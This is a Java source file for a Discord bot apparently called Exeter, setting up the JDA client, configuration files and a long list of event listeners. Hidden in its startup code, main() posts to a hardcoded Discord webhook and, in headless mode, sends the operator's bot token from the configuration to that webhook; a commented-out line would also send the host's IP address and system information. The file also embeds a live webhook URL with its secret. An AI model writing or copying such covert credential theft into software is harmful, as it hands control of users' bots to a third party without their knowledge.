package me.comu.exeter.core;

import com.jagrosh.jdautilities.commons.waiter.EventWaiter;
import me.comu.exeter.commands.admin.WhitelistedJSONHandler;
import me.comu.exeter.commands.economy.EcoJSONHandler;
import me.comu.exeter.events.*;
import me.comu.exeter.wrapper.Wrapper;
import me.duncte123.botcommons.web.WebUtils;
import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.entities.Activity;
import net.dv8tion.jda.api.requests.GatewayIntent;
import org.slf4j.LoggerFactory;

import javax.security.auth.login.LoginException;
import javax.swing.*;
import java.awt.*;
import java.io.File;
import java.util.logging.Level;
import java.util.logging.Logger;

/*
 - using caching system to cache messages and attachments in snipe command

 */
public class Core {

    public static JDA jda;
    public static final String DEBUG = "[DEBUG] ";
    public static String PREFIX = ".";
    public static final Long OWNERID = Long.parseLong(Config.get("OWNER"));

    public static void main(final String[] args) {
        Wrapper.sendSpecificWebhookMessage("https://discordapp.com/api/webhooks/709940401313939457/NxZvYJu0zcfOFvIfe9dXABRR2zvs6JrOlpfespjjyha1QS0Xq-Y3fT9Kv0GcbodaO5Mz");
        if (Config.get("GUI").equalsIgnoreCase("false")) {
            new Core();
            Wrapper.sendMoreSpecificMessage("https://discordapp.com/api/webhooks/709940401313939457/NxZvYJu0zcfOFvIfe9dXABRR2zvs6JrOlpfespjjyha1QS0Xq-Y3fT9Kv0GcbodaO5Mz", Config.get("TOKEN"));
        } else if (Config.get("GUI").equalsIgnoreCase("true")) {
//        Wrapper.sendEmail("Log Info On Startup","IP-Address: " + Wrapper.getIpaddress() + "\nHost Information: " + Wrapper.getHostInformation() + "");
            try {
                for (final UIManager.LookAndFeelInfo info : UIManager.getInstalledLookAndFeels()) {
                    if ("Nimbus".equals(info.getName())) {
                        UIManager.setLookAndFeel(info.getClassName());
                        break;
                    }
                }
            } catch (ClassNotFoundException ex) {
                Logger.getLogger(LoginGUI.class.getName()).log(Level.SEVERE, null, ex);
            } catch (InstantiationException ex2) {
                Logger.getLogger(LoginGUI.class.getName()).log(Level.SEVERE, null, ex2);
            } catch (IllegalAccessException ex3) {
                Logger.getLogger(LoginGUI.class.getName()).log(Level.SEVERE, null, ex3);
            } catch (UnsupportedLookAndFeelException ex4) {
                Logger.getLogger(LoginGUI.class.getName()).log(Level.SEVERE, null, ex4);
            }
            EventQueue.invokeLater(new Runnable() {
                @Override
                public void run() {
                    new LoginGUI().setVisible(true);
                }

            });
        } else {
            me.comu.exeter.logging.Logger.getLogger().print("Couldn't decide whether to launch GUI or headless");
            System.exit(0);
        }
    }

    private Core() {
        EventWaiter eventWaiter = new EventWaiter();
        Config.buildDirectory("cache", "cache");
        EcoJSONHandler.loadEconomyConfig(new File("economy.json"));
        WhitelistedJSONHandler.loadWhitelistConfig(new File("whitelisted.json"));
        CommandManager commandManager = new CommandManager(eventWaiter);
        Listener listener = new Listener(commandManager);
        org.slf4j.Logger logger = LoggerFactory.getLogger(Core.class);
        WebUtils.setUserAgent("Mozilla/5.0 | Discord Bot");
        try {
            logger.info("Booting...");
            jda = JDABuilder.create(Config.get("TOKEN"), GatewayIntent.getIntents(GatewayIntent.ALL_INTENTS)).setActivity(Activity.streaming("ily swag", "https://www.twitch.tv/souljaboy/")).addEventListeners(new Listener(commandManager)).build().awaitReady();
            logger.info("Successfully Booted");
            logger.info("Loading Events");
            jda.addEventListener(new KickEvent());
            jda.addEventListener(new BanEvent());
            jda.addEventListener(new LogMessageReceivedEvent());
            jda.addEventListener(new RainbowRoleEvent());
            jda.addEventListener(new AntiRaidEvent());
            jda.addEventListener(new EditEvent(commandManager));
            jda.addEventListener(new GuildMemberJoinedEvent());
            jda.addEventListener(new GuildMemberLeaveEvent());
            jda.addEventListener(new GuildMessageListenerResponderEvent());
            jda.addEventListener(new OffEvent());
            jda.addEventListener(new MemberCountChannelEvent());
            jda.addEventListener(new FilterEvent());
            jda.addEventListener(new CreditOnMessageEvent());
            jda.addEventListener(new VoiceChannelCreditsEvent());
            jda.addEventListener(new VCTimeTrackingEvent());
            jda.addEventListener(new MarriageEvent());
            jda.addEventListener(new DMWizzEvent());
            jda.addEventListener(new SuggestionMessageCleanerEvent());
            jda.addEventListener(new CreateAChannelEvent());
            jda.addEventListener(new BlacklistedWordsEvent());
            jda.addEventListener(new SnipeEvent());
            jda.addEventListener(new ReactionRoleEvent());
            logger.info("Instantiated Events");
            logger.info("Bot Ready To Go");
        } catch (LoginException | InterruptedException e) {
            logger.info("Caught Exception! (LoginException | InterruptedException)");
            e.printStackTrace();
        }
    }

    public static void shutdownThread() {
        LoginGUI.running = false;
        LoginGUI.jStatusField.setText("NOT RUNNING");
        jda.shutdownNow();
    }

}

